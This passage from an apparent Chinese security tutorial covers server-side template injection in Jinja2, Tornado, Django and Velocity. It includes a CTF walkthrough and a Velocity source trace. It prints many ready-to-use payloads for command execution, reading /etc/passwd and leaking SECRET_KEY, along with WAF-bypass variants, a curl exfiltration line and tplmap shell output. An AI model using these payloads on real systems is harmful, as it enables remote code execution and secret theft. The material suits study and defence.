<p>这时候就要推荐<strong>builtins</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">search &#x3D; &#39;__builtins__&#39;</span><br><span class="line">num &#x3D; -1</span><br><span class="line">for i in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    try:</span><br><span class="line">        #print(i.__init__.__globals__.keys())</span><br><span class="line">        if search in i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 58)</span><br><span class="line">(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 59)</span><br><span class="line">(&lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, 60)</span><br><span class="line">(&lt;class &#39;_weakrefset.WeakSet&#39;&gt;, 61)</span><br><span class="line">(&lt;class &#39;site._Printer&#39;&gt;, 71)</span><br><span class="line">(&lt;class &#39;site.Quitter&#39;&gt;, 76)</span><br><span class="line">(&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, 77)</span><br><span class="line">(&lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, 78)</span><br></pre></td></tr></table></figure>

<p>这时候我们的命令执行payload就出来了：</p>
<p>python3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure>

<p>python2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure>

<p>实际效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&quot;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209161439230.png" alt="image-20220209161439230"></p>
<h3 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得基类</span><br><span class="line">#python2.7</span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line">#python3.7</span><br><span class="line">&#39;&#39;.__。。。class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line">#python 2.7</span><br><span class="line">#文件操作</span><br><span class="line">#找到file类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">#读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">#os执行</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</span><br><span class="line">#eval,impoer等全局函数</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line"></span><br><span class="line">#python3.7</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#windows下的os命令</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="一些绕过waf的姿势"><a href="#一些绕过waf的姿势" class="headerlink" title="一些绕过waf的姿势"></a>一些绕过waf的姿势</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤["></a>过滤[</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#getitem、pop</span><br><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure>

<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#chr函数</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure>

<h4 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure>

<h4 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;         &#x2F;&#x2F;popen的参数就是要执行的命令</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p>
<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python3 tplmap.py -u &quot;http:&#x2F;&#x2F;172.20.10.2:8000&#x2F;?name&#x3D;*&quot; --os-shell</span><br><span class="line">Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">Testing if GET parameter &#39;name&#39; is injectable</span><br><span class="line">Smarty plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">Smarty plugin is testing blind injection</span><br><span class="line">Mako plugin is testing rendering with tag &#39;$&#123;*&#125;&#39;</span><br><span class="line">Mako plugin is testing blind injection</span><br><span class="line">Python plugin is testing rendering with tag &#39;str(*)&#39;</span><br><span class="line">Python plugin is testing blind injection</span><br><span class="line">Tornado plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Tornado plugin is testing blind injection</span><br><span class="line">Jinja2 plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Jinja2 plugin has confirmed injection with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">Run commands on the operating system.</span><br><span class="line">posix-linux $ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>一键shell真香，还支持其他模版(Smarty, Mako, Tornado, Jinja2) 的注入检测</p>
<h2 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h2><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</p>
<p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tornado.template</span><br><span class="line">import tornado.ioloop</span><br><span class="line">import tornado.web</span><br><span class="line">TEMPLATE &#x3D; &#39;&#39;&#39;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt; Hello max &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    def get(self):</span><br><span class="line">        name &#x3D; self.get_argument(&#39;name&#39;, &#39;&#39;)</span><br><span class="line">        template_data &#x3D; TEMPLATE.replace(&quot;FOO&quot;,name)</span><br><span class="line">        t &#x3D; tornado.template.Template(template_data)</span><br><span class="line">        self.write(t.generate(name&#x3D;name))</span><br><span class="line"></span><br><span class="line">application &#x3D; tornado.web.Application([(r&quot;&#x2F;&quot;, MainHandler),], debug&#x3D;True, static_path&#x3D;None, template_path&#x3D;None)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    application.listen(8000)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure>

<p>我们这里来用BUUCTF的easy_tornado来学习一下tornado render注入：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173354843.png" alt="image-20220209173354843"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173408296.png" alt="image-20220209173408296"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173423416.png" alt="image-20220209173423416"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173438540.png" alt="image-20220209173438540"></p>
<p>根据上面的信息，我们知道flag在/fllllllllllllag文件中</p>
<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用</p>
<p>最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e583b767-ac22-4e38-8217-71136655925f.node4.buuoj.cn:81&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;3cf85a0e74c78ca404fd6ba98f1eacaa</span><br></pre></td></tr></table></figure>

<p>推测md5加密过后的值就是url中filehash对应的值,想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret</p>
<p>在tornado模板中，存在一些可以访问的快速对象，比如 &#123;&#123;escape(handler.settings[“cookie”])&#125;&#125;，这个其实就是handler.settings对象，里面存储着一些环境变量，具体分析请参照《<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p>
<p>观察错误页面，发现页面返回的由msg的值决定</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173614183.png" alt="image-20220209173614183"></p>
<p>修改msg的值注入，获得环境变量</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173654529.png" alt="image-20220209173654529"></p>
<p>得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename&#x3D;&#39;&#x2F;fllllllllllllag&#39;</span><br><span class="line">cookie_secret&#x3D;&quot;0eac01c9-92b5-459e-b475-287893e5ff3f&quot;</span><br><span class="line">hash.update(filename.encode(&#39;utf-8&#39;))</span><br><span class="line">s1&#x3D;hash.hexdigest()</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174140368.png" alt="image-20220209174140368"></p>
<p>得到filehash=e952b058e7c5d648833b3bb13c52bb1b，获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e583b767-ac22-4e38-8217-71136655925f.node4.buuoj.cn:81&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;e952b058e7c5d648833b3bb13c52bb1b</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174219355.png" alt="image-20220209174219355"></p>
<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>先看存在漏洞的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template &#x3D; &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;)</span><br><span class="line">    return HttpResponse(template.format(user&#x3D;request.user))</span><br></pre></td></tr></table></figure>

<p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p>
<p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209175837650.png" alt="image-20220209175837650"></p>
<p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Java中的SSTI"><a href="#Java中的SSTI" class="headerlink" title="Java中的SSTI"></a>Java中的SSTI</h1><p>java常见的引擎：FreeMarker， velocity</p>
<h2 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h2><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
<p><strong>基本语法</strong></p>
<p><strong>语句标识符</strong></p>
<p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p>
<p><strong>变量</strong></p>
<p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p>
<p><strong>声明</strong></p>
<p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set($a &#x3D;&quot;velocity&quot;)</span><br><span class="line">#set($b&#x3D;1)</span><br><span class="line">#set($arrayName&#x3D;[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure>

<p><strong>注释</strong></p>
<p>单行注释为##，多行注释为成对出现的#* …………. *#</p>
<p><strong>条件语句</strong></p>
<p>以if/else为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($foo&#x3D;&#x3D;10)</span><br><span class="line">    &lt;strong&gt;2&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($bar&#x3D;&#x3D;6)</span><br><span class="line">    &lt;strong&gt;3&lt;&#x2F;strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;&#x2F;strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>

<p>转义字符</p>
<p><strong>转义字符</strong></p>
<p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p>
<p><strong>基础使用</strong></p>
<p>使用Velocity主要流程为：</p>
<ul>
<li>初始化Velocity模板引擎，包括模板路径、加载类型等</li>
<li>创建用于存储预传递到模板文件的数据的上下文</li>
<li>选择具体的模板文件，传递数据完成渲染</li>
</ul>
<p>VelocityTest.java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.apache.velocity.Template;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.VelocityEngine;</span><br><span class="line"></span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">public class VelocityTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine &#x3D; new VelocityEngine();</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src&#x2F;main&#x2F;resources&quot;);</span><br><span class="line">        velocityEngine.init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;Rai4over&quot;);</span><br><span class="line">        context.put(&quot;project&quot;, &quot;Velocity&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Template template &#x3D; velocityEngine.getTemplate(&quot;test.vm&quot;);</span><br><span class="line">        StringWriter sw &#x3D; new StringWriter();</span><br><span class="line">        template.merge(context, sw);</span><br><span class="line">        System.out.println(&quot;final output:&quot; + sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模版文件：src/main/resources/test.vm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is $name.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final output:</span><br><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is Victor Zhang.</span><br><span class="line">Project is Velocity</span><br><span class="line">java.lang.UNIXProcess@12f40c25</span><br></pre></td></tr></table></figure>

<p>通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。</p>
<p>通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。</p>
<p>通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。</p>
<p>我们这里使用Java-sec-code里面的SSTI代码（关于Java-sec-code相关部分在之前的文章已经写过）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">public void velocity(String template) &#123;</span><br><span class="line">    Velocity.init();</span><br><span class="line"></span><br><span class="line">    VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">    context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">    context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">    context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">    StringWriter swOut &#x3D; new StringWriter();</span><br><span class="line">    Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在最初的Controller层下断点，来追踪poc的解析过程</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210111913083.png" alt="image-20220210111913083"></p>
<p>（template -&gt; instring）进入 Velocity.evaluate 方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static boolean evaluate(Context context, Writer out, String logTag, String instring) throws ParseErrorException, MethodInvocationException, ResourceNotFoundException &#123;</span><br><span class="line">    return RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210113238084.png" alt="image-20220210113238084"></p>
<p>继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115314686.png" alt="image-20220210115314686"></p>
<p>RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115616974.png" alt="image-20220210115616974"></p>
<p>进入StringReader查看在进入evaluate查看方法具体实现过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean evaluate(Context context, Writer writer, String logTag, Reader reader) &#123;</span><br><span class="line">        if (logTag &#x3D;&#x3D; null) &#123;</span><br><span class="line">            throw new NullPointerException(&quot;logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            SimpleNode nodeTree &#x3D; null;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">            &#x2F;&#x2F; 来到这里进行解析</span><br><span class="line">                nodeTree &#x3D; this.parse(reader, logTag);</span><br><span class="line">            &#125; catch (ParseException var7) &#123;</span><br><span class="line">                throw new ParseErrorException(var7, (String)null);</span><br><span class="line">            &#125; catch (TemplateInitException var8) &#123;</span><br><span class="line">                throw new ParseErrorException(var8, (String)null);</span><br><span class="line">            &#125;</span><br><span class="line">           &#x2F;&#x2F; 判断，然后进入this.render方法</span><br><span class="line">            return nodeTree &#x3D;&#x3D; null ? false : this.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进render方法</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121343406.png" alt="image-20220210121343406"></p>
<p>render方法里面还有一个render方法,不过这个是simpleNodel类的render方法。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121433075.png" alt="image-20220210121433075"></p>
<p>由于前面两个没有什么用，让我们直接跳到for循环的第三个看，进入render方法。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121748125.png" alt="image-20220210121748125"></p>
<p>在这里我们发现有一个execute方法，这就是罪魁祸首。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122230972.png" alt="image-20220210122230972"></p>
<ul>
<li>让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(int i &#x3D; 0; i &lt; this.numChildren; ++i) &#123;</span><br><span class="line">     if (this.strictRef &amp;&amp; result &#x3D;&#x3D; null) &#123;</span><br><span class="line">         methodName &#x3D; this.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">         throw new VelocityException(&quot;Attempted to access &#39;&quot; + methodName + &quot;&#39; on a null value at &quot; + Log.formatFileString(this.uberInfo.getTemplateName(), this.jjtGetChild(i).getLine(), this.jjtGetChild(i).getColumn()));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     previousResult &#x3D; result;</span><br><span class="line">     result &#x3D; this.jjtGetChild(i).execute(result, context);</span><br><span class="line">     if (result &#x3D;&#x3D; null &amp;&amp; !this.strictRef) &#123;</span><br><span class="line">         failedChild &#x3D; i;</span><br><span class="line">         break;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。</li>
<li>previousResult = result;首先这行代码使其它们保持一致</li>
<li>当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122522307.png" alt="image-20220210122522307"></p>
<p>完整的调用链如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122717456.png" alt="image-20220210122717456"></p>
<h2 id="Confluence未授权RCE分析"><a href="#Confluence未授权RCE分析" class="headerlink" title="Confluence未授权RCE分析"></a>Confluence未授权RCE分析</h2><p>（CVE-2019-3396）</p>
